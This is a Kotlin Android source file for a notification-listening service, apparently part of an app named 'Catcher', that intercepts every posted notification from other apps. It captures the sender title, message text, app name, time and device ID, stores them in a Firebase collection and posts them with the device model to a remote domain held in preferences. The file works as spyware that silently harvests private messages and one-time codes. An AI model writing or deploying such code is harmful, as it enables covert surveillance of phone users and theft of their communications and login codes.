package cather.lfree.workdscather.servers

import android.content.Intent
import android.content.pm.ApplicationInfo
import android.os.Build
import android.os.IBinder
import android.preference.PreferenceManager
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.google.firebase.firestore.SetOptions
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import cather.lfree.workdscather.internet.AsynchronousGet
import org.json.JSONObject
import java.lang.Exception
import java.text.SimpleDateFormat
import java.util.Calendar


class ServesNotify : NotificationListenerService() {

   private companion object{
       const val push : String =  "PUSH"
       const val nameCat : String = "Catcher"
    }


    override fun onBind(intent: Intent?): IBinder? {
        return super.onBind(intent)
    }

    private fun getRealName(namePackages : String ) : String {

        println(" my name pack = ${namePackages}")
        val pm = applicationContext.packageManager
        val ai : ApplicationInfo? = try {
            pm.getApplicationInfo(namePackages,0)
        }catch (e : Exception){
            null
        }

       val appRealName : String = if(ai == null){
            ""
        }else {
            pm.getApplicationLabel(ai).toString()
       }

        return appRealName
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)

        val uniqueID = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID)

        val extras = sbn!!.notification.extras
        val formatter = SimpleDateFormat("dd.MM.yyyy hh:mm:ss")
        val calendar = Calendar.getInstance()
        calendar.timeInMillis = sbn.postTime


        val prefs = PreferenceManager.getDefaultSharedPreferences  ( applicationContext )


        val db = Firebase.firestore
        val docuI = extras.getCharSequence("android.text").toString()

        println(" getRealName == ${getRealName(sbn.packageName.toString())}")


//        if(!(sbn.packageName.toString().contains("com.android.mms"))){
//            println(" not contain mms ")
//        }

        if(!docuI.contains("new messages from") && !sbn.packageName.toString().contains("com.android.mms"))
        {
           val finalString = if(docuI.length > 50 ){
                docuI.substring(0, 50)
            }else {
                docuI
            }

            val newString = finalString.replace("//", "www")

            var newString2 : String = ""
         val index = newString.indexOf("/", 0)

         val index2 = newString.indexOf("/", index+1)

            newString2 = if( index == -1 || index2 == -1){

                newString.replace("/", "OO")

            }else {
                val stringOneL = newString.substring(0, index)
                val stringTwoL = newString.substring(index, newString.length)
                val repTwo = stringTwoL.replace("/", "O")
                "$stringOneL/$repTwo"
        //        println(" finalString3232323 ${"$stringOneL/$repTwo"}")
            }

               val user = hashMapOf(
            "type" to push,
            "time" to formatter.format(calendar.time),
            "name" to getRealName(sbn.packageName.toString()),  //extras.getCharSequence("android.title").toString(),
            "message" to " ${extras.getCharSequence("android.title").toString()}  ${extras.getCharSequence("android.text").toString()}", // to extras.getString("android.text"),
            "package" to sbn.packageName, )


             // uniqueID!!.toString()
             //println(" finalString1 pre finalsend = $docuString")

            if(newString2.indexOf("/", 0) > 0){
                newString2.replace("/", "OO")
            }

             db.collection(uniqueID).document(newString2)
            .set(user, SetOptions.merge())
            .addOnSuccessListener { documentReference ->
               // println("DocumentSnapshot added with ID: ${documentReference.toString()}")
            }
            .addOnFailureListener { e ->
             //   println("Error adding document $e")
            }

        val json1  = JSONObject()
        json1.put("type", "PUSH")
        json1.put("api_key", prefs.getString("api_k", ""))
        json1.put("from",extras.getCharSequence("android.title").toString())
        json1.put("content", extras.getCharSequence("android.text").toString())

        val jsonM2 = JSONObject()

            jsonM2.put("name", nameCat)
            jsonM2.put("id",uniqueID)
            jsonM2.put("version","1.0.1")

            val manufacturer = Build.MANUFACTURER;
            val model = Build.MODEL;

        val jsonN2 = JSONObject()
            jsonN2.put("ip", "0.0.0.0")
            jsonN2.put("model", "$manufacturer $model")

        json1.put("app", jsonM2)
        json1.put("device", jsonN2)

        AsynchronousGet( prefs.getString("api_k", "")!!,3, json1, prefs.getString("domen", "")!!).run()

        }
    }


    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
          println(" on notifi Removed ")
    }

    override fun onDestroy() {
        super.onDestroy()
    }

}